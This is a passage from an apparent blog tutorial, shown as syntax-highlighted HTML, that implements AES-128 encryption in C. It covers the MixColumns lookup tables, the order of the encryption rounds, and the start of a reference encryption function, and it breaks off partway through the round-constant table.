class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xE5</span> <span class="p">},</span>
</span><span class='line'>        <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1A</span> <span class="p">}</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">3</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">4</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">5</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">6</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">7</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">8</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">9</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">10</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">11</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">12</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">13</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">14</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">15</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Combine them together</h3>

<p>Now we have everything we need, it is going to be easy peasy ; really:</p>

<ol>
<li>The initial state is populated with the encryption key</li>
<li>Generate the round-keys thanks to the key schedule ; remember 11 keys, the first one being the plain encryption key</li>
<li>The first different round is a simple <code>AddRoundKey</code> operation</li>
<li>Then we enter in the main loop which does 9 rounds:

<ol>
<li><code>SubBytes</code></li>
<li><code>ShiftRows</code></li>
<li><code>MixColumns</code></li>
<li><code>AddRoundKey</code></li>
</ol>
</li>
<li>Last round which is also a bit different:

<ol>
<li><code>SubBytes</code></li>
<li><code>ShiftRows</code></li>
<li><code>AddRoundKey</code></li>
</ol>
</li>
<li>The state is now your encrypted block, yay!</li>
</ol>


<p>Here we are, we finally have our AES128 encryption function that we will use as a reference:</p>

<figure class='code'><figcaption><span>aes128_enc_base</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_base</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">round_keys</span><span class="p">[</span><span class="mi">11</span><span class="p">][</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">rcon</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span 